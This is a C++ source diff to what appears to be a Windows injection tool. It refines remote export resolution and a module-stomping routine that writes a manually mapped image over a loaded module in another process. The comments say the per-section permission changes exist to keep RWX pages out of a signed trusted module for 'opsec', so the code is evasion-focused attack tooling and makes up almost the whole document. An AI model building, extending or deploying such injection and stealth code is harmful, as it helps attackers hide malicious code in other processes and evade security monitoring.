@@ -194,33 +194,36 @@ void ApplyRelocs(std::uint8_t* buf, const IMAGE_NT_HEADERS64* nt, std::intptr_t 
 }
 
 std::uintptr_t RemoteExport(HANDLE proc, std::uintptr_t remoteBase, const char* name) {
+    auto rpm = [&](std::uintptr_t at, void* dst, size_t sz) {
+        return ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(at), dst, sz, nullptr) != 0;
+    };
     IMAGE_DOS_HEADER dos{};
-    if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase),
-                           &dos, sizeof(dos), nullptr) ||
-        dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
+    if (!rpm(remoteBase, &dos, sizeof(dos))) return 0;
+    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
     IMAGE_NT_HEADERS64 nt{};
-    if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + dos.e_lfanew),
-                           &nt, sizeof(nt), nullptr)) return 0;
+    if (!rpm(remoteBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;
     auto& dir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    if (!dir.VirtualAddress) return 0;
+    if (!dir.VirtualAddress || !dir.Size) return 0;
     std::vector<std::uint8_t> buf(dir.Size);
-    if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + dir.VirtualAddress),
-                           buf.data(), dir.Size, nullptr)) return 0;
+    if (!rpm(remoteBase + dir.VirtualAddress, buf.data(), dir.Size)) return 0;
     auto* ex = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(buf.data());
     std::vector<DWORD> names(ex->NumberOfNames);
     std::vector<WORD>  ords (ex->NumberOfNames);
     std::vector<DWORD> funcs(ex->NumberOfFunctions);
-    ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + ex->AddressOfNames),
-                      names.data(), names.size()*4, nullptr);
-    ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + ex->AddressOfNameOrdinals),
-                      ords.data(),  ords.size()*2, nullptr);
-    ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + ex->AddressOfFunctions),
-                      funcs.data(), funcs.size()*4, nullptr);
+    if (ex->NumberOfNames &&
+        !rpm(remoteBase + ex->AddressOfNames,        names.data(), names.size()*4)) return 0;
+    if (ex->NumberOfNames &&
+        !rpm(remoteBase + ex->AddressOfNameOrdinals, ords.data(),  ords.size()*2))  return 0;
+    if (ex->NumberOfFunctions &&
+        !rpm(remoteBase + ex->AddressOfFunctions,    funcs.data(), funcs.size()*4)) return 0;
+    const DWORD edStart = dir.VirtualAddress, edEnd = dir.VirtualAddress + dir.Size;
     for (DWORD i = 0; i < ex->NumberOfNames; ++i) {
         char n[256]{};
-        if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + names[i]),
-                               n, sizeof(n)-1, nullptr)) continue;
-        if (std::strcmp(n, name) == 0) return remoteBase + funcs[ords[i]];
+        if (!rpm(remoteBase + names[i], n, sizeof(n)-1)) return 0;
+        if (std::strcmp(n, name) != 0) continue;
+        const DWORD rva = funcs[ords[i]];
+        if (rva >= edStart && rva < edEnd) return 0; // forwarder
+        return remoteBase + rva;
     }
     return 0;
 }
@@ -450,24 +453,44 @@ mapper::Result InjectStomp(DWORD pid,
         return { false, "imports", "IAT resolution failed", 0 };
     }
 
-    // Flip stomped pages to RW first (they are RX), write, flip back per section.
-    DWORD oldPage;
-    VirtualProtectEx(proc, reinterpret_cast<LPVOID>(stompBase),
-                     imgSize, PAGE_EXECUTE_READWRITE, &oldPage);
-    if (!WriteProcessMemory(proc, reinterpret_cast<LPVOID>(stompBase),
-                            local.data(), imgSize, nullptr)) {
-        VirtualProtectEx(proc, reinterpret_cast<LPVOID>(stompBase),
-                         imgSize, oldPage, &oldPage);
-        CloseHandle(proc);
-        return { false, "write", "WriteProcessMemory failed", 0 };
-    }
+    // Per-section flip-write-restore. We NEVER do a blanket imgSize-wide
+    // RWX flip anymore — the audit flagged that as leaving inter-section
+    // gap pages (part of the stomped module's original .text/.rdata) in
+    // RWX inside a signed trusted module, defeating the §6.7 opsec goal.
+    // The headers region at the stomp base and each section's VA..VA+VS
+    // range get flipped individually; everything else keeps the module's
+    // original protection.
+    auto flipWriteRestore = [&](std::uintptr_t at, DWORD size,
+                                const void* src, DWORD finalProt) -> bool {
+        if (!size) return true;
+        DWORD saved = 0;
+        if (!VirtualProtectEx(proc, reinterpret_cast<LPVOID>(at), size,
+                              PAGE_EXECUTE_READWRITE, &saved)) return false;
+        const bool wrote = WriteProcessMemory(proc, reinterpret_cast<LPVOID>(at),
+                                              src, size, nullptr) != 0;
+        DWORD tmp = 0;
+        VirtualProtectEx(proc, reinterpret_cast<LPVOID>(at), size, finalProt, &tmp);
+        return wrote;
+    };
 
+    // Headers window first. SizeOfHeaders is page-sized by the loader; we
+    // write it then flip to R (we'll zero it in the EraseHeaders path).
+    if (!flipWriteRestore(stompBase,
+                          img.nt->OptionalHeader.SizeOfHeaders,
+                          local.data(),
+                          PAGE_READONLY)) {
+        CloseHandle(proc);
+        return { false, "write", "WriteProcessMemory (headers) failed", 0 };
+    }
     for (WORD i = 0; i < img.nt->FileHeader.NumberOfSections; ++i) {
-        DWORD prot = SectionProt(sec[i].Characteristics);
-        DWORD old = 0;
-        VirtualProtectEx(proc,
-            reinterpret_cast<LPVOID>(stompBase + sec[i].VirtualAddress),
-            (std::max<DWORD>)(sec[i].Misc.VirtualSize, 1), prot, &old);
+        const DWORD vs = (std::max<DWORD>)(sec[i].Misc.VirtualSize, 1);
+        if (!flipWriteRestore(stompBase + sec[i].VirtualAddress,
+                              vs,
+                              local.data() + sec[i].VirtualAddress,
+                              SectionProt(sec[i].Characteristics))) {
+            CloseHandle(proc);
+            return { false, "write", "WriteProcessMemory (section) failed", 0 };
+        }
     }
 
     std::uintptr_t entry = FindExport(local.data(),
